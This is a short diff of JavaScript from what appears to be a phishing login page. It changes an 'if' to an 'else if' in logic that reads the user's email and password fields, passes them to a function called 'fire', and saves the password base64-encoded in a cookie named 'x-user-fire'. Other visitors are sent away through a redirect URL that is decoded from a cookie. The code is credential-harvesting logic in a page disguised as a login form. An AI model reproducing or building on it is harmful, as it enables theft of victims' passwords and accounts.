@@ -176,8 +176,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
                 Cookies.set("x", 1001);
                 location.href = atob(Cookies.get("r"));
                 return;
-            }
-			if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
+            }else if(fire(document.getElementById('uremail').value,document.getElementById('pw').value,v)) {
                 Cookies.set("x", 1002);
                 Cookies.set("x-user-fire", btoa(document.getElementById('pw').value));
             }
